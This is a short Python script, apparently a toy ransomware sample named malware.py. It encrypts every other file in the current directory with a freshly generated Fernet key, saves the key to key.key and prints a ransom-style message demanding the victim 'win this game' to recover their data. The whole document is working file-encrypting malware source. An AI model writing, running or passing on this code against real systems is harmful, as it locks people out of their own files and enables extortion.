import os
from cryptography.fernet import Fernet


files = []
for file in os.listdir():
    if file=="malware.py" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
with open("key.key","wb") as key_file:
    key_file.write(key)

for file in files:
    with open(file,"rb") as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as the_file:
        the_file.write(contents_encrypted)

print("All of your files have been encrypted! Win this game to get your data back")